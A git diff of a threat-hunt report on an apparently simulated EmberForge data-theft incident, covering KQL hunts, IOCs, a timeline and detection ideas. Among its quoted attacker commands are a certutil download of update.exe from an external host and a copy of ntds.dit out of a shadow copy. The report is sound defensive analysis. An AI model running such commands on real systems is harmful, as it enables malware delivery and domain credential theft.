@@ -1,5 +1,22 @@
 # Threat Hunt Report – EmberForge Source Leak Investigation
 
+# Executive Summary
+
+A threat hunting investigation was conducted within Microsoft Sentinel after suspicious activity was identified in the EmberForge environment. The investigation revealed successful data collection, archive staging, cloud-based exfiltration using rclone, attacker credential exposure, and Active Directory credential database theft via NTDS access.
+
+The attacker leveraged Living Off The Land (LOTL) techniques and legitimate administrative utilities including PowerShell and certutil to evade detection while transferring sensitive company data externally.
+
+The investigation confirmed:
+
+* successful data exfiltration,
+* attacker-controlled staging infrastructure,
+* exposed attacker credentials,
+* and evidence of potential full domain compromise.
+
+---
+
+# Threat Hunt Report – EmberForge Source Leak Investigation
+
 # Environment Details
 
 | Item                 | Value                                       |
@@ -10,152 +27,6 @@
 | Custom Log Table     | EmberForgeX_CL                              |
 
 ---
-# Additional Sections – Investigation Objective & Hunt Tasks
-
----
-
-
-# 2. Exfiltration Tool Discovery
-
-## Investigation Task
-
-The objective was to determine:
-
-* what tool was used to exfiltrate the stolen data,
-* whether the tool was legitimate software,
-* and how the attacker transferred files externally.
-
-## What I Looked For
-
-* Cloud synchronization utilities
-* File transfer tools
-* External upload commands
-* Repeated tool execution attempts
-* Suspicious command-line arguments
-
----
-
-# 3. Attacker Email Attribution
-
-## Investigation Task
-
-The objective was to identify:
-
-* attacker-controlled cloud credentials,
-* exposed authentication details,
-* and attribution indicators left in command-line activity.
-
-## What I Looked For
-
-* rclone configuration activity
-* Credential-related command lines
-* Usernames and email addresses
-* Configuration file creation activity
-* Authentication parameters
-
----
-
-# 4. Plaintext Credential Exposure
-
-## Investigation Task
-
-The objective was to determine whether:
-
-* credentials were exposed in plaintext,
-* command-line arguments leaked sensitive information,
-* and operational security mistakes could aid attribution.
-
-## What I Looked For
-
-* Password arguments
-* Authentication flags
-* Inline credentials
-* Failed execution attempts
-* Insecure command-line usage
-
----
-
-# 5. Exfiltration Destination IP
-
-## Investigation Task
-
-The objective was to correlate:
-
-* the exfiltration process,
-* outbound network activity,
-* and the external IP address receiving stolen data.
-
-## What I Looked For
-
-* Sysmon network connection events
-* Event ID 3 telemetry
-* Process-to-network correlation
-* Outbound connections from rclone.exe
-* External destination IPs
-
----
-
-# 6. Active Directory Credential Database Theft
-
-## Investigation Task
-
-The objective was to determine whether:
-
-* the attacker accessed Domain Controller credential stores,
-* volume shadow copy techniques were used,
-* and Active Directory compromise occurred.
-
-## What I Looked For
-
-* NTDS references
-* Shadow copy usage
-* vssadmin activity
-* Credential dumping indicators
-* File copy operations involving ntds.dit
-
----
-
-# 7. Staging Infrastructure Discovery
-
-## Investigation Task
-
-The objective was to identify:
-
-* attacker-controlled infrastructure,
-* how tools entered the environment,
-* and whether the same external server was reused across hosts.
-
-## What I Looked For
-
-* Download utilities
-* LOLBins used for tool transfer
-* External URLs
-* certutil activity
-* PowerShell web requests
-* Repeated external infrastructure references
-
----
-
-# 8. DNS Infrastructure Correlation
-
-## Investigation Task
-
-The objective was to correlate:
-
-* suspicious DNS activity,
-* repeated external domains,
-* and infrastructure linked to attacker operations.
-
-## What I Looked For
-
-* Sysmon DNS query events
-* Event ID 22 telemetry
-* External domains
-* Repeated hostname lookups
-* Non-corporate infrastructure
-
----
-
 
 # 1. Data Collection & Archive Creation
 
@@ -195,7 +66,25 @@ EmberForgeX_CL
 
 ---
 
-# 3. Exfiltration Tool Discovery
+# 2. Exfiltration Tool Discovery
+
+## Investigation Task
+
+The objective was to determine:
+
+* what tool was used to exfiltrate the stolen data,
+* whether the tool was legitimate software,
+* and how the attacker transferred files externally.
+
+## What I Looked For
+
+* Cloud synchronization utilities
+* File transfer tools
+* External upload commands
+* Repeated tool execution attempts
+* Suspicious command-line arguments
+
+---
 
 ## Query Used
 
@@ -214,7 +103,25 @@ EmberForgeX_CL
 
 ---
 
-# 4. Attacker Email Attribution
+# 3. Attacker Email Attribution
+
+
+## Investigation Task
+
+The objective was to identify:
+
+* attacker-controlled cloud credentials,
+* exposed authentication details,
+* and attribution indicators left in command-line activity.
+
+## What I Looked For
+
+* rclone configuration activity
+* Credential-related command lines
+* Usernames and email addresses
+* Configuration file creation activity
+* Authentication parameters
+
 
 ## Query Used
 
@@ -232,7 +139,24 @@ EmberForgeX_CL
 
 ---
 
-# 5. Plaintext Credential Exposure
+# 4. Plaintext Credential Exposure
+
+
+## Investigation Task
+
+The objective was to determine whether:
+
+* credentials were exposed in plaintext,
+* command-line arguments leaked sensitive information,
+* and operational security mistakes could aid attribution.
+
+## What I Looked For
+
+* Password arguments
+* Authentication flags
+* Inline credentials
+* Failed execution attempts
+* Insecure command-line usage
 
 ## Query Used
 
@@ -250,8 +174,24 @@ EmberForgeX_CL
 
 ---
 
-# 6. Exfiltration Destination IP
+# 5. Exfiltration Destination IP
 
+## Investigation Task
+
+The objective was to correlate:
+
+* the exfiltration process,
+* outbound network activity,
+* and the external IP address receiving stolen data.
+
+## What I Looked For
+
+* Sysmon network connection events
+* Event ID 3 telemetry
+* Process-to-network correlation
+* Outbound connections from rclone.exe
+* External destination IPs
+  
 ## Query Used
 
 ```kql
@@ -273,7 +213,23 @@ EmberForgeX_CL
 
 ---
 
-# 7. Active Directory Credential Database Theft
+# 6. Active Directory Credential Database Theft
+
+## Investigation Task
+
+The objective was to determine whether:
+
+* the attacker accessed Domain Controller credential stores,
+* volume shadow copy techniques were used,
+* and Active Directory compromise occurred.
+
+## What I Looked For
+
+* NTDS references
+* Shadow copy usage
+* vssadmin activity
+* Credential dumping indicators
+* File copy operations involving ntds.dit
 
 ## Query Used
 
@@ -302,8 +258,25 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Wi
 
 ---
 
-# 8. Staging Infrastructure Discovery
+# 7. Staging Infrastructure Discovery
 
+## Investigation Task
+
+The objective was to identify:
+
+* attacker-controlled infrastructure,
+* how tools entered the environment,
+* and whether the same external server was reused across hosts.
+
+## What I Looked For
+
+* Download utilities
+* LOLBins used for tool transfer
+* External URLs
+* certutil activity
+* PowerShell web requests
+* Repeated external infrastructure references
+  
 ## Query Used
 
 ```kql
@@ -340,8 +313,24 @@ certutil -urlcache -f http://sync.cloud-endpoint.net:8080/update.exe C:\Users\Pu
 
 ---
 
-# 9. DNS Infrastructure Correlation
+# 8. DNS Infrastructure Correlation
 
+## Investigation Task
+
+The objective was to correlate:
+
+* suspicious DNS activity,
+* repeated external domains,
+* and infrastructure linked to attacker operations.
+
+## What I Looked For
+
+* Sysmon DNS query events
+* Event ID 22 telemetry
+* External domains
+* Repeated hostname lookups
+* Non-corporate infrastructure
+  
 ## Query Used
 
 ```kql
@@ -360,6 +349,21 @@ EmberForgeX_CL
 
 ---
 
+
+# Attack Timeline
+
+| Stage                    | Activity                                                    |
+| ------------------------ | ----------------------------------------------------------- |
+| Tool Transfer            | certutil downloaded update.exe from attacker infrastructure |
+| Data Collection          | Sensitive data gathered from C:\GameDev                     |
+| Archive Creation         | Compress-Archive created gamedev.zip                        |
+| Exfiltration Preparation | rclone configured with MEGA credentials                     |
+| Credential Exposure      | Plaintext MEGA password exposed in command line             |
+| Exfiltration             | gamedev.zip uploaded to MEGA                                |
+| Domain Compromise        | NTDS database copied via Volume Shadow Copy                 |
+
+---
+
 # Indicators of Compromise (IOCs)
 
 | Type                | Value                                                 |
@@ -369,6 +373,7 @@ EmberForgeX_CL
 | Email               | [jwilson.vhr@proton.me](mailto:jwilson.vhr@proton.me) |
 | Tool                | rclone.exe                                            |
 | Tool                | update.exe                                            |
+| Cmdlet              | Compress-Archive                                      |
 | Archive             | gamedev.zip                                           |
 | Sensitive Directory | C:\GameDev                                            |
 
@@ -386,6 +391,34 @@ EmberForgeX_CL
 | Ingress Tool Transfer         | T1105     |
 | NTDS Credential Dumping       | T1003.003 |
 | Unsecured Credentials         | T1552     |
+
+---
+
+# Detection Opportunities
+
+Potential detections identified during the investigation:
+
+* Monitor execution of rclone.exe
+* Alert on Compress-Archive usage in sensitive directories
+* Detect certutil outbound downloads
+* Monitor Event ID 3 network connections from uncommon utilities
+* Alert on NTDS.dit access attempts
+* Monitor Volume Shadow Copy abuse
+* Detect plaintext credential exposure in command-line arguments
+* Alert on external DNS queries to uncommon infrastructure
+
+---
+
+# Impact Assessment
+
+The investigation confirmed:
+
+* successful theft of proprietary development data,
+* external cloud-based exfiltration,
+* exposure of attacker infrastructure and credentials,
+* and potential compromise of all Active Directory credentials through NTDS database access.
+
+Based on the observed activity, the environment should be treated as fully compromised until remediation and credential rotation are completed.
 
 ---
 
